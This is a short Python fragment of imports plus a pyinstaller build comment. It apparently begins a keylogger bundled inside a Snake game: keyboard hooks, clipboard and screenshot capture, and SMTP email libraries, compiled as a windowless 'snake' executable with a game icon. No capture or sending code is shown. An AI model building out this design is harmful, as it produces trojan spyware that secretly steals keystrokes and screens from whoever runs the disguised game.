import pyHook, pythoncom, sys, win32api, win32con, os, time
import win32clipboard, zipfile
from PIL import ImageGrab
import shutil, getpass
import mimetypes, smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from snake import start_game

import system
# pyinstaller -F -w -n snake -i Snake.ico index.py